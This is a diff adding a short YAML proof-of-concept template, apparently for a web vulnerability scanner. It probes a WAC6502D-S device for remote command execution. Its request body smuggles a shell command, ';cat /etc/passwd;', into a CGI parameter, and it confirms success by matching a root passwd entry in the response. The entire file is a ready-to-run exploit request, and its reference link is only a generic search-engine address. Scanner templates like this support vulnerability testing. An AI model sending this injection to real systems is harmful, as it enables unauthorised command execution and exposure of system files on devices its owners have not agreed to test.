@@ -1,0 +1,19 @@
+name: poc-yaml-wac6502d-s-rce
+manual: true
+transport: http
+rules:
+  druid1:
+    request:
+      cache: true
+      method: POST
+      path: /cgi-bin/export-cgi/images
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        category=custom.rules&arg0=;cat /etc/passwd;
+    expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression: druid1()
+detail:
+  author: wooluo(https://github.com/wooluo)
+  links:
+    - https://www.baidu.com
